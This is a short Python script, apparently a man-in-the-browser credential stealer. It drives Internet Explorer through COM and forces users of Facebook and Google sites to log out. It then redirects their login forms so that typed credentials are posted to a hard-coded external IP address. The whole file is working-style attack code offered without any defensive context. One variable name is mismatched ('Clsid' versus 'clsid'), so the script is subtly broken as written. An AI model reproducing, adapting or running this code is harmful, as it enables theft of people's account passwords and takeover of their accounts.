import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://45.77.207.168:8000/"

target_sites  = {}
target_sites["www.facebook.com"] = {
                                    "logout_url"      : None,
                                     "logout_form"     : "logout_form",
                                     "login_form_index": 0,
                                     "owned"           : False
                                    }

target_sites["accounts.google.com"] = {
                                        "logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
                                         "logout_form"      : None,
                                         "login_form_index" : 0,
                                         "owned"            : False
                                      }

target_sites["www.gmail.com"]           = target_sites["accounts.google.com"] 
target_sites["mail.google.com"]         = target_sites["accounts.google.com"]
target_sites["myaccount.google.com"]    = target_sites["accounts.google.com"]

Clsid='{0E1487F2-9865-4CD5-B99A-9C5EB063A2BC}'

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

def main(*args, **kwargs):
    while True:
        for browser in windows:
            try:
                url = urlparse.urlparse(browser.LocationUrl)
                if url.hostname in target_sites:
                    if target_sites[url.hostname]["owned"]:
                        continue
                    if target_sites[url.hostname]["logout_url"]:
                        browser.Navigate(target_sites[url.hostname]["logout_url"])
                        wait_for_browser(browser)
                    else:
                        full_doc = browser.Document.all
                        for i in full_doc:
                            try:
                                if i.id == target_sites[url.hostname]["logout_form"]:
                                    i.submit()
                                    wait_for_browser(browser)
                            except:
                                pass
                    try:
                        login_index = target_sites[url.hostname]["login_form_index"]
                        login_page = urllib.quote(browser.LocationUrl)
                        browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                        target_sites[url.hostname]["owned"] = True
                    except: pass
            
            except KeyboardInterrupt:
                break
        time.sleep(5)

if __name__ == '__main__':
    main()
